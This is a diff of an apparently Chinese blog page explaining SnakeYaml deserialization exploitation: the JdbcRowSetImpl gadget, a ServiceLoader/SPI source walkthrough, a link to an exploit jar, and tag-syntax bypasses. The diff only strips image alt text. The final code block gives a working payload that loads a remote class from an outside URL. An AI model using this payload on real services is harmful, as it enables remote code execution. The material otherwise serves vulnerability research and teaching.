@@ -646,7 +646,7 @@
 <li>Yaml.dump()：将一个对象转化为yaml文件形式；</li>
 </ul>
 <p>其中序列化出来的对象格式为<code>!!Snake.类名</code></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="20220802103026-11a270ac-120b-1"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在反序列化时可以用<code>!!</code>指定反序列化的类名，跟fastjson一样</p>
 <p>且是调用setter赋值，fastjson能用的JdbcRowSetImpl肯定能用</p>
 <h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>注意SnakeYaml不能互转false和0，所以payload填false bool</p>
@@ -662,21 +662,21 @@
 <p><strong>只有在使用迭代器遍历时，才会按需加载对应的类并创建其实例。</strong></p>
 <p>我们从源码分析下</p>
 <h3 id="SPI源码分析"><a href="#SPI源码分析" class="headerlink" title="SPI源码分析"></a>SPI源码分析</h3><p>锁定到<code>ServiceLoader.load(Class&lt;T&gt; service)</code>，调用了另一个参数的load</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150437749"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>然后调用ServiceLoader构造函数</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150534513"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>构造函数调用reload</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150551381"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>reload生成了一个LazyIterator</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150602218"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>跟进到这个LazyIterator内部类，很明显我们在使用这个迭代器的时候，会先调用hashNext-&gt;hasNextService；再调用next，进而调用到nextService</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023151104157"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在它的hasNextService获取了类路径为”META-IN&#x2F;services&#x2F;“+类名，并getResource，注意这里获取到的是configs的路径。后面的parse是解析这个configs</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153246135"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>parse按行解析configs文件</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153346166"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在ServiceLoader.LazyInterator的nextService内完成了Class.forName初始化和newInstance实例化</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023151007315"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>如果load的参数可以是http URL，是不是意味着ServiceLoader.load能加载远程META-INF&#x2F;services下的恶意类？</p>
 <h3 id="SPI使用"><a href="#SPI使用" class="headerlink" title="SPI使用"></a>SPI使用</h3><p>先看看SPI怎么用的：</p>
 <ul>
@@ -690,19 +690,19 @@
 </li>
 </ul>
 <p>所以我们本地需要在META-INF&#x2F;services创建一个文件（用于configs加载），文件内容是我们需要加载的类的全限定名</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153838191"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>然后恶意类实现ScriptEngineFactroy接口，并在构造函数 or 静态代码块写恶意代码。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153932389"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>为什么是ScriptEngineFactory接口？</p>
 <p>根据前面的内容，我们不难推断漏洞触发为ServiceLoader.load生成迭代器，调用迭代器时完成任意类加载</p>
 <p>我们看下ScriptEngineFactory完成SPI的代码：</p>
 <p>ScriptEngineFactory.initEngines先调用getServiceLoader，然后获取了迭代器，并在循环中使用了迭代器（hasNext-&gt;next）</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023154445075"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>其中getServiceLoader就是ServiceLoader.load</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023154554020"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>这里load传入的service时ScriptEngineFactory，所以我们的恶意类需要实现ScriptEngineFactory接口</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>META-INF目录结构，放configs。恶意类放在源代码目录</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023164923527"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>为了一个URL同时对外部提供这两个文件用于加载，需要打包成jar，我打包好了发布在了my github：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar">https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar</a></p>
 <p>POC：</p>
@@ -772,8 +772,8 @@
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><code>!!</code>可以用TAG来绕过</p>
 <p>Tag的声明位于org.yaml.snakeyaml.nodes.Tags</p>
 <h3 id="换为tag-yaml-org-2002"><a href="#换为tag-yaml-org-2002" class="headerlink" title="!!换为tag:yaml.org,2002:"></a><code>!!</code>换为<code>tag:yaml.org,2002:</code></h3><p><code>!!</code>实际上就是一个Tag，等同于<code>&quot;tag:yaml.org,2002:&quot;</code>加一个后缀。除了这里声明的类，Tag就是<code>&quot;tag:yaml.org,2002:&quot;</code>+类的全限定名，比如<code>!!javax.script.ScriptEngineManager</code>的Tag是<code>tag:yaml.org,2002:javax.script.ScriptEngineManager</code></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028112037343"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028113132038"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>除此之外还有两种替换方式</p>
 <h3 id="lt-tag-gt"><a href="#lt-tag-gt" class="headerlink" title="!&lt;tag&gt;"></a><code>!&lt;tag&gt;</code></h3><p><code>!!javax.script.ScriptEngineManager</code>换为<code>!&lt;tag:yaml.org,2002:javax.script.ScriptEngineManager&gt;</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!&lt;tag:yaml.org,<span class="number">2002</span>:javax.script.ScriptEngineManager&gt; <span class="string">&quot; +</span></span><br><span class="line"><span class="string">                &quot;</span>[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URLClassLoader&gt; [[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URL&gt;<span class="string">&quot; +</span></span><br><span class="line"><span class="string">                &quot;</span> [\<span class="string">&quot;http://b1ue.cn/\&quot;]]]]</span></span><br></pre></td></tr></table></figure>
